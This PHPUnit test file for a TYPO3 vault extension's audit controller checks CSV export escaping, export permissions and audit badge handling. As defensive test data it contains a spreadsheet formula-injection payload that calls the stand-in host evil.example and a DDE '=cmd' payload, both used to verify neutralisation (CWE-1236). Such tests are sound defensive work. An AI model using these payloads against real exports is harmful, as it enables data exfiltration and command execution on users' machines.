<?php

/*
 * Copyright (c) 2025-2026 Netresearch DTT GmbH
 * SPDX-License-Identifier: GPL-2.0-or-later
 */

declare(strict_types=1);

namespace Netresearch\NrVault\Tests\Unit\Controller;

use Netresearch\NrVault\Audit\AuditAction;
use Netresearch\NrVault\Audit\AuditLogEntry;
use Netresearch\NrVault\Audit\AuditLogServiceInterface;
use Netresearch\NrVault\Controller\AuditController;
use Netresearch\NrVault\Controller\ModuleAccessGuard;
use Netresearch\NrVault\Security\AccessControlServiceInterface;
use Netresearch\NrVault\Security\VaultPermission;
use Netresearch\NrVault\Tests\Unit\TestCase;
use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\Attributes\Test;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;
use ReflectionClass;
use TYPO3\CMS\Backend\Template\ModuleTemplateFactory;

/**
 * Unit tests for the CSV audit export writer of AuditController.
 *
 * The module render is covered by the functional/E2E suites (the class is
 * excluded from the unit coverage source set, hence no CoversClass attribute);
 * these tests assert the emitted CSV bytes of the private export seam, which
 * consults no constructor dependency. They pin the strict RFC-4180 output
 * (`escape: ''`): with PHP's legacy escape character an attacker-controlled
 * audit field could terminate its own quoted cell and inject a spreadsheet
 * formula into a cell that CsvFormulaSanitizer never inspected (CWE-1236).
 */
#[AllowMockObjectsWithoutExpectations]
final class AuditControllerTest extends TestCase
{
    /**
     * Backslash followed by a double quote — the byte sequence PHP's legacy
     * escape character keeps unescaped, closing the quoted cell for every
     * RFC-4180 consumer.
     */
    private const BREAKOUT_PAYLOAD = 'x\\",=HYPERLINK("http://evil.example/"&A1,"open")';

    #[Test]
    public function csvExportDoublesEnclosuresAfterABackslash(): void
    {
        $csv = $this->exportCsv([$this->createEntry(requestId: self::BREAKOUT_PAYLOAD)]);

        // The quote following the backslash is doubled, so it stays cell data.
        self::assertStringContainsString('"x\\"",=HYPERLINK(', $csv);
        // Sanity check on the inverse: the unescaped, cell-terminating form
        // that the legacy escape character produced must not appear.
        self::assertStringNotContainsString('"x\\",=HYPERLINK(', $csv);
    }

    #[Test]
    public function csvExportKeepsBreakoutPayloadInsideASingleCell(): void
    {
        $csv = $this->exportCsv([$this->createEntry(requestId: self::BREAKOUT_PAYLOAD)]);

        [$header, $row] = $this->parseCsv($csv);

        self::assertCount(\count($header), $row);

        $columnIndex = array_search('requestId', $header, true);
        self::assertIsInt($columnIndex);
        self::assertSame(self::BREAKOUT_PAYLOAD, $row[$columnIndex]);

        foreach ($row as $cell) {
            self::assertThat(
                $cell === '' || !\in_array($cell[0], ['=', '+', '-', '@', "\t", "\r"], true),
                self::isTrue(),
                'No exported cell may start with a spreadsheet formula leader, got: ' . $cell,
            );
        }
    }

    #[Test]
    public function csvExportStillNeutralizesFormulaLeaders(): void
    {
        $csv = $this->exportCsv([$this->createEntry(userAgent: "=cmd|' /C calc'!A0")]);

        [$header, $row] = $this->parseCsv($csv);

        $columnIndex = array_search('userAgent', $header, true);
        self::assertIsInt($columnIndex);
        self::assertSame("'=cmd|' /C calc'!A0", $row[$columnIndex]);
    }

    /**
     * `audit.view` deliberately does not cover `audit.export`: the downloaded
     * copy leaves the tamper-evident storage behind, so reading the log in the
     * module and walking off with the full history are separate grants.
     */
    #[Test]
    public function exportActionReturns403ForHolderOfAuditViewOnly(): void
    {
        $auditLogService = $this->createMock(AuditLogServiceInterface::class);
        $auditLogService
            ->expects(self::never())
            ->method('export');

        $subject = $this->createControllerGranting($auditLogService, VaultPermission::AuditView);

        $request = $this->createMock(ServerRequestInterface::class);
        $request->method('getQueryParams')->willReturn(['format' => 'json']);

        $response = $subject->exportAction($request);

        self::assertSame(403, $response->getStatusCode());
        $body = json_decode((string) $response->getBody(), true, 512, JSON_THROW_ON_ERROR);
        self::assertIsArray($body);
        self::assertFalse($body['success']);
        self::assertSame('Access denied', $body['error']);
    }

    #[Test]
    public function exportActionSucceedsWithAuditExportPermission(): void
    {
        $auditLogService = $this->createMock(AuditLogServiceInterface::class);
        $auditLogService
            ->expects(self::once())
            ->method('export')
            ->willReturn([]);

        $subject = $this->createControllerGranting($auditLogService, VaultPermission::AuditExport);

        $request = $this->createMock(ServerRequestInterface::class);
        $request->method('getQueryParams')->willReturn(['format' => 'json']);

        $response = $subject->exportAction($request);

        self::assertSame(200, $response->getStatusCode());
        self::assertSame('application/json', $response->getHeaderLine('Content-Type'));
    }

    /**
     * The audit module renders `{entry.action}` inside a badge whose CSS class
     * comes from `getActionBadgeClass()` (`Audit/List.html:99`).
     *
     * Every row under `http_call_cancelled` means a credential was injected and
     * handed to the transport before the call was abandoned, so it must not sit
     * in the grey default next to an ordinary completed call — that grey is what
     * an operator scans past. The pre-flight case is an abandoned call too, but
     * with nothing to act on, so it is distinguishable without being alarming.
     */
    #[Test]
    public function eachAbandonedOutboundCallGetsItsOwnBadgeInTheAuditModule(): void
    {
        $reflection = new ReflectionClass(AuditController::class);
        $subject = $reflection->newInstanceWithoutConstructor();
        $badgeClass = $reflection->getMethod('getActionBadgeClass');

        self::assertSame('warning', $badgeClass->invoke($subject, 'http_call_cancelled'));
        self::assertSame('info', $badgeClass->invoke($subject, 'http_call_cancelled_before_send'));
        self::assertSame(
            'secondary',
            $badgeClass->invoke($subject, 'http_call'),
            'An ordinary completed call keeps the neutral badge, or the new ones signal nothing.',
        );
    }

    /**
     * The filter dropdown is what makes a row queryable in the module, and its
     * whole point is that a writer never has to remember to register an action
     * there. So the needle here is the literal string `VaultHttpClient` persists
     * — NOT `AuditAction::cases()`, which is the same expression the controller
     * evaluates and would make this assertion true of itself.
     *
     * A hard-coded list in the controller (which is what this derivation
     * replaced, and which had silently omitted the master_key_* and oauth_*
     * actions) fails here.
     */
    #[Test]
    public function everyActionTheHttpClientWritesReachesTheFilterDropdown(): void
    {
        $reflection = new ReflectionClass(AuditController::class);
        $subject = $reflection->newInstanceWithoutConstructor();

        $offered = $reflection->getMethod('filterableActions')->invoke($subject);
        self::assertIsArray($offered);

        foreach (['http_call', 'http_call_cancelled', 'http_call_cancelled_before_send'] as $written) {
            self::assertContains(
                $written,
                $offered,
                \sprintf('"%s" is written to the chain but cannot be filtered for.', $written),
            );
        }
    }

    /**
     * The persisted strings are bound into the HMAC hash payload, so changing
     * one breaks verification of every historical row that used it. Pinning the
     * two cancellation values against literals is what makes such a rename show
     * up as a test failure rather than as an unverifiable chain.
     */
    #[Test]
    public function theCancellationActionValuesAreFrozen(): void
    {
        self::assertSame('http_call_cancelled', AuditAction::HttpCallCancelled->value);
        self::assertSame('http_call_cancelled_before_send', AuditAction::HttpCallCancelledBeforeSend->value);
    }

    /**
     * Build a controller wired with only the seams `exportAction()` consults:
     * the audit log service and the permission guard.
     *
     * The constructor pulls in `final readonly` TYPO3 services this test does
     * not need, hence `newInstanceWithoutConstructor()` + property injection
     * (same approach as the sibling OverviewControllerTest).
     */
    private function createControllerGranting(
        AuditLogServiceInterface $auditLogService,
        VaultPermission ...$granted,
    ): AuditController {
        $accessControlService = $this->createMock(AccessControlServiceInterface::class);
        $accessControlService
            ->method('isGranted')
            ->willReturnCallback(
                static fn (VaultPermission $permission): bool => \in_array($permission, $granted, true),
            );

        $moduleTemplateFactory = (new ReflectionClass(ModuleTemplateFactory::class))
            ->newInstanceWithoutConstructor();

        $reflection = new ReflectionClass(AuditController::class);
        $subject = $reflection->newInstanceWithoutConstructor();
        $reflection->getProperty('auditLogService')->setValue($subject, $auditLogService);
        $reflection->getProperty('accessGuard')->setValue(
            $subject,
            new ModuleAccessGuard($accessControlService, $moduleTemplateFactory),
        );

        return $subject;
    }

    /**
     * @param list<AuditLogEntry> $entries
     */
    private function exportCsv(array $entries): string
    {
        $reflection = new ReflectionClass(AuditController::class);
        $subject = $reflection->newInstanceWithoutConstructor();

        $response = $reflection->getMethod('exportAsCsv')->invoke($subject, $entries);
        self::assertInstanceOf(ResponseInterface::class, $response);

        return (string) $response->getBody();
    }

    /**
     * Parse the export the way an RFC-4180 consumer (Excel, LibreOffice,
     * Google Sheets) does: quotes are only escaped by doubling.
     *
     * @return array{list<string>, list<string>}
     */
    private function parseCsv(string $csv): array
    {
        $handle = fopen('php://temp', 'r+');
        self::assertIsResource($handle);
        fwrite($handle, $csv);
        rewind($handle);

        $rows = [];
        while (($row = fgetcsv($handle, escape: '')) !== false) {
            $rows[] = array_map(static fn (mixed $cell): string => \is_string($cell) ? $cell : '', $row);
        }

        fclose($handle);

        self::assertCount(2, $rows, 'Expected exactly a header row and one data row.');

        return [$rows[0], $rows[1]];
    }

    private function createEntry(string $requestId = 'req-1', string $userAgent = 'curl/8.0'): AuditLogEntry
    {
        return new AuditLogEntry(
            uid: 1,
            secretIdentifier: 'app/api-key',
            action: 'read',
            success: true,
            errorMessage: null,
            reason: null,
            actorUid: 1,
            actorType: 'backend',
            actorUsername: 'admin',
            actorRole: 'admin',
            ipAddress: '203.0.113.7',
            userAgent: $userAgent,
            requestId: $requestId,
            previousHash: str_repeat('a', 64),
            entryHash: str_repeat('b', 64),
            hashBefore: '',
            hashAfter: '',
            crdate: 1750000000,
            context: ['source' => 'unit-test'],
        );
    }
}
